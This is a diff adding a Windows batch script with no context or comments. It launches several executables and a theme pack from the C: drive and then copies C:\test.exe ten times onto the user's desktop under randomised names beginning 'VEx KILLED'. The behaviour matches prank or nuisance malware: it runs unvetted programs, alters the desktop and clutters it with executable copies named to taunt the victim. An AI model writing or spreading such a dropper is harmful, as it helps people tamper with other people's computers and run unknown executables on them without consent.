@@ -1,0 +1,18 @@
+@echo off 
+Goto 1
+
+:1
+start c:\vexwork1.exe
+start c:\vexwork4.exe
+start c:\vexwork3.deskthemepack
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+copy "C:\test.exe" "%userprofile%\Desktop\VEx KILLED%random%.exe"
+exit
